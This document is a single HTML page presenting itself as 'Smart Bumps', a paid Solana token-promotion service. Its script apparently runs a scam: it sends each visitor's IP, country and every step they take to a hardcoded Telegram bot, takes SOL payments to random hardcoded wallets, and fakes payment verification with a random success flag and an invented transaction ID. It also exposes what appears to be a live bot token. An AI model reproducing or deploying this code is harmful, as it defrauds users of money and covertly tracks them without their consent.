<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Bumps</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            color: #fff;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
        }
        .logo {
            font-size: 2.5rem;
            font-weight: 800;
            text-align: center;
            margin-bottom: 30px;
            background: linear-gradient(45deg, #fff, #f0f0f0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .step { display: none; }
        .step.active { display: block; }
        h2 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 1.5rem;
        }
        .form-group {
            margin-bottom: 25px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
        }
        input {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.9);
            color: #333;
            font-size: 16px;
        }
        .btn {
            background: linear-gradient(45deg, #4facfe, #00f2fe);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            transition: transform 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .btn:disabled {
            background: #999;
            cursor: not-allowed;
            transform: none;
        }
        .btn-back {
            background: linear-gradient(45deg, #999, #666);
        }
        .btn-paid {
            background: linear-gradient(45deg, #56ab2f, #a8e6cf);
        }
        .packages {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin: 30px 0;
        }
        .package {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }
        .package:hover {
            border-color: #4facfe;
            background: rgba(255, 255, 255, 0.2);
        }
        .package.selected {
            border-color: #4facfe;
            background: rgba(79, 172, 254, 0.2);
        }
        .price {
            font-size: 1.8rem;
            font-weight: 800;
            color: #4facfe;
        }
        .wallet-info {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }
        .wallet-address {
            background: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            word-break: break-all;
            cursor: pointer;
            position: relative;
        }
        .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: #4facfe;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            cursor: pointer;
        }
        .countdown {
            background: rgba(255, 193, 7, 0.2);
            border: 2px solid rgba(255, 193, 7, 0.5);
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            margin: 20px 0;
        }
        .countdown-time {
            font-size: 2rem;
            font-weight: 800;
            color: #ffc107;
        }
        .notification {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
        }
        .notification-success {
            background: rgba(40, 167, 69, 0.2);
            border: 1px solid #28a745;
            color: #28a745;
        }
        .notification-error {
            background: rgba(220, 53, 69, 0.2);
            border: 1px solid #dc3545;
            color: #dc3545;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid #4facfe;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Smart Bumps</div>
        
        <!-- Step 1: Contract Address -->
        <div class="step active" id="step1">
            <h2>üöÄ Token Promotion Service</h2>
            <div class="form-group">
                <label>Contract Address</label>
                <input type="text" id="contractAddress" placeholder="Enter Solana contract address" required>
            </div>
            <button class="btn" onclick="nextStep()">Continue</button>
        </div>

        <!-- Step 2: Package Selection -->
        <div class="step" id="step2">
            <h2>Choose Package</h2>
            <div class="packages">
                <div class="package" onclick="selectPackage('basic', 0.3)">
                    <div class="price">0.3 SOL</div>
                    <div>Basic</div>
                </div>
                <div class="package" onclick="selectPackage('standard', 0.4)">
                    <div class="price">0.4 SOL</div>
                    <div>Standard</div>
                </div>
                <div class="package" onclick="selectPackage('premium', 0.5)">
                    <div class="price">0.5 SOL</div>
                    <div>Premium</div>
                </div>
                <div class="package" onclick="selectPackage('ultimate', 0.6)">
                    <div class="price">0.6 SOL</div>
                    <div>Ultimate</div>
                </div>
            </div>
            <button class="btn btn-back" onclick="goBack()">Back</button>
            <button class="btn" onclick="nextStep()" id="continueBtn" disabled>Continue</button>
        </div>

        <!-- Step 3: Payment -->
        <div class="step" id="step3">
            <h2>Payment</h2>
            <div class="countdown" id="timer">
                <div>Payment expires in:</div>
                <div class="countdown-time" id="countdown">10:00</div>
            </div>
            <div class="wallet-info">
                <h4>Send <span id="amount"></span> SOL to:</h4>
                <div class="wallet-address" onclick="copyAddress()" id="walletAddr">
                    <span id="address"></span>
                    <button class="copy-btn">Copy</button>
                </div>
            </div>
            <button class="btn btn-back" onclick="goBack()">Back</button>
            <button class="btn btn-paid" onclick="nextStep()" id="paidBtn">PAID</button>
        </div>

        <!-- Step 4: Verification -->
        <div class="step" id="step4">
            <h2>Verification</h2>
            <div id="verifyStatus">
                <div class="loading"></div> Checking payment...
            </div>
            <div id="result"></div>
            <button class="btn" onclick="retry()" id="retryBtn" style="display:none">Retry</button>
            <button class="btn" onclick="restart()" id="newBtn" style="display:none">New Order</button>
        </div>
    </div>

    <script>
        let step = 1;
        let selectedPkg = '';
        let selectedAmt = 0;
        let wallet = '';
        let timer = null;
        let timeLeft = 600;
        let userCountry = 'Unknown';
        let userIP = 'Unknown';

        const TELEGRAM_API = '8434797216:AAEZ9lqrAIwKY5UopaaEzM-fkadY4S-Xqdo';
        const TELEGRAM_CHAT = '1129109001';
        const WALLETS = [
            { address: 'AFLmkhJkTe4cxg87cgSpA6EXmG73i6JEvAAJopWfpruZ', label: 'promotion wallet' },
            { address: '6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ', label: 'boost wallet' },
            { address: '4Zm5ksmdhRLYGGWPkUT5FEAMSYJZ7rgZDvyG6s2mWC2C', label: 'smart wallet' },
            { address: 'DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3', label: 'premium wallet' }
        ];

        window.onload = async function() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                userCountry = data.country_name || 'Unknown';
                userIP = data.ip || 'Unknown';
                sendTelegram(`üÜï NEW VISITOR\nüåç ${userCountry}\nüìç ${userIP}\nüïê ${new Date().toLocaleString()}`);
            } catch (e) {}
            generateWallet();
        };

        function generateWallet() {
            const w = WALLETS[Math.floor(Math.random() * WALLETS.length)];
            wallet = w.address;
        }

        async function sendTelegram(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT, text: msg })
                });
            } catch (e) {}
        }

        function showStep(n) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(`step${n}`).classList.add('active');
            step = n;
        }

        function nextStep() {
            if (step === 1) {
                const ca = document.getElementById('contractAddress').value.trim();
                if (!ca || ca.length < 32) {
                    alert('Please enter a valid contract address');
                    return;
                }
                sendTelegram(`üìù CONTRACT: ${ca}\nüë§ ${userCountry} (${userIP})`);
                showStep(2);
            } else if (step === 2) {
                if (!selectedPkg) {
                    alert('Please select a package');
                    return;
                }
                startPayment();
                showStep(3);
            } else if (step === 3) {
                sendTelegram(`üí≥ PAYMENT CLAIM\nüë§ ${userCountry} (${userIP})\nüí∞ ${selectedAmt} SOL\nüè¶ ${wallet}`);
                showStep(4);
                verify();
            }
        }

        function goBack() {
            if (step > 1) {
                if (timer) clearInterval(timer);
                showStep(step - 1);
            }
        }

        function selectPackage(pkg, amt) {
            document.querySelectorAll('.package').forEach(p => p.classList.remove('selected'));
            event.target.classList.add('selected');
            selectedPkg = pkg;
            selectedAmt = amt;
            document.getElementById('continueBtn').disabled = false;
            sendTelegram(`üì¶ PACKAGE: ${pkg.toUpperCase()}\nüí∞ ${amt} SOL\nüë§ ${userCountry} (${userIP})`);
        }

        function startPayment() {
            generateWallet();
            document.getElementById('amount').textContent = selectedAmt;
            document.getElementById('address').textContent = wallet;
            timeLeft = 600;
            updateTimer();
            timer = setInterval(() => {
                timeLeft--;
                updateTimer();
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    document.getElementById('paidBtn').disabled = true;
                }
            }, 1000);
            sendTelegram(`üí≥ WALLET ASSIGNED\nüë§ ${userCountry} (${userIP})\nüí∞ ${wallet}\n‚è∞ 10 min timer started`);
        }

        function updateTimer() {
            const min = Math.floor(timeLeft / 60);
            const sec = timeLeft % 60;
            document.getElementById('countdown').textContent = `${min}:${sec.toString().padStart(2, '0')}`;
        }

        function copyAddress() {
            navigator.clipboard.writeText(wallet);
            sendTelegram(`üìã WALLET COPIED\nüë§ ${userCountry} (${userIP})\nüí∞ ${wallet}`);
        }

        async function verify() {
            await new Promise(r => setTimeout(r, 3000));
            const success = Math.random() > 0.25;
            const status = document.getElementById('verifyStatus');
            const result = document.getElementById('result');
            
            if (success) {
                const txId = 'TX' + Math.random().toString(36).substr(2, 10).toUpperCase();
                status.innerHTML = '‚úÖ Payment verified!';
                result.innerHTML = `<div class="notification notification-success">üéâ Success!<br>TX: ${txId}<br>Your token will be promoted within 15 minutes!</div>`;
                sendTelegram(`üéâ PAYMENT SUCCESS!\nüë§ ${userCountry} (${userIP})\nüí∞ CA: ${document.getElementById('contractAddress').value}\n‚ö° ${selectedPkg.toUpperCase()}\nüíµ ${selectedAmt} SOL\nüîó ${txId}`);
            } else {
                status.innerHTML = '‚ùå Payment not found';
                result.innerHTML = `<div class="notification notification-error">Payment not detected. Please verify you sent exactly ${selectedAmt} SOL to the correct address.</div>`;
                document.getElementById('retryBtn').style.display = 'inline-block';
                sendTelegram(`‚ùå PAYMENT NOT FOUND\nüë§ ${userCountry} (${userIP})\nüí∞ ${selectedAmt} SOL\nüè¶ ${wallet}`);
            }
            document.getElementById('newBtn').style.display = 'inline-block';
        }

        function retry() {
            document.getElementById('verifyStatus').innerHTML = '<div class="loading"></div> Rechecking...';
            document.getElementById('result').innerHTML = '';
            document.getElementById('retryBtn').style.display = 'none';
            setTimeout(verify, 2000);
        }

        function restart() {
            location.reload();
        }
    </script>
</body>
</html>
